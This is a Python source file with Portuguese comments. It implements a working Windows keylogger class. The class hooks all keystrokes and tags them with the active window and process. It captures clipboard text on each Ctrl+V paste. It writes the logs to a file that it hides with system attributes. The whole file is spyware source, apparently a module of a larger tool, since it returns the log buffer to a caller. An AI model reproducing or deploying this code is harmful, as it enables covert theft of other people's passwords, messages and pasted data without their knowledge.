from ctypes import byref, c_ulong, create_string_buffer, windll
import os
import subprocess
import time
import win32clipboard
import win32con
import keyboard

TIMER = 60


class Keylogger:
    """Definição da classe, inicializando os atributos necessários"""

    def __init__(self):
        self.key_log = {}
        self.current_window = None
        self.current_process = None
        self.process_id = None
        self.ctrl_pressed = False
        self.caps_lock_mode = False
        self.clipboard_data = ""

    def get_process(self):
        """Função para obter o processo que o usuário esta em foco"""
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = pid.value

        exe = create_string_buffer(2048)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(exe), 2048)

        window_title = create_string_buffer(2048)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 2048)

        try:
            self.current_window = window_title.value.decode('latin-1')
        except UnicodeDecodeError:
            self.current_window = "<Unknown>"

        self.current_process = exe.value.decode('latin-1')
        self.process_id = process_id

    def capture_keys(self, e):
        """Função para a captura de teclas, além do tratamento de teclas especiais"""
        key_char = ""

        if e.name == "ctrl":
            self.ctrl_pressed = e.event_type == keyboard.KEY_DOWN

        if e.name == "caps lock" and e.event_type == keyboard.KEY_DOWN:
            self.caps_lock_mode = not self.caps_lock_mode
            return

        if e.event_type == keyboard.KEY_DOWN:
            self.get_process()

            if e.name.isprintable() and len(e.name) == 1:
                key_char = e.name.upper() if self.caps_lock_mode else e.name.lower()
            elif e.name == "space":
                key_char = " "
            elif e.name == "backspace":
                if self.current_window in self.key_log and self.key_log[self.current_window]["log"]:
                    self.key_log[self.current_window]["log"] = self.key_log[self.current_window]["log"][:-1]
                return
            else:
                key_char = f"[{e.name.upper()}]"

            if self.current_window not in self.key_log:
                current_time = time.strftime(
                    "%d/%m/%Y %H:%M:%S", time.localtime())
                self.key_log[self.current_window] = {
                    "timestamp": current_time,
                    "process_id": self.process_id,
                    "process": self.current_process,
                    "log": "",
                    "pasted": [],
                }

            if e.name == "v" and self.ctrl_pressed:
                time.sleep(0.2)
                self.get_clipboard()
                self.key_log[self.current_window]["pasted"].append(
                    self.clipboard_data)

            self.key_log[self.current_window]["log"] += key_char

    def get_clipboard(self):
        """Função para obter o que está no CTRL + C (clipboard)"""
        try:
            win32clipboard.OpenClipboard()

            if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                self.clipboard_data = win32clipboard.GetClipboardData()

                if isinstance(self.clipboard_data, bytes):
                    return self.clipboard_data.decode('latin-1')
                else:
                    return self.clipboard_data
            else:
                return "[Clipboard vazio ou formato incompatível]"

        except Exception as e:
            return f"[Clipboard Error: {e}]"

        finally:
            try:
                win32clipboard.CloseClipboard()
            except Exception:
                pass

    def main(self, duration=30):
        """Função main, define o processo de coletada dos dados e retorna o **buffer** com os logs"""
        self.key_log = {}
        logs_filename = "logs.txt"
        buffer = []

        keyboard.hook(self.capture_keys)
        start_time = time.time()

        while time.time() - start_time < duration:
            time.sleep(0.1)

        for window, data in self.key_log.items():
            log_text = (
                f"Time: {data['timestamp']}\n"
                f"Window: {window}\n"
                f"(Process: {data['process']}, ID: {data['process_id']})\n\n"
                f"Log:\n\"{data['log']}\"\n\n"
                f"Pasted (Ctrl+V):\n{chr(10).join(data['pasted'])}\n"
            )

            buffer.append(log_text)

            with open(logs_filename, "a", encoding="latin-1") as file:
                subprocess.call(["attrib", "+h", "+s", logs_filename])
                file.write("\n" + "-" * 65 + "\n")
                file.write(log_text)
                file.write("-" * 65 + "\n")

        return buffer, logs_filename
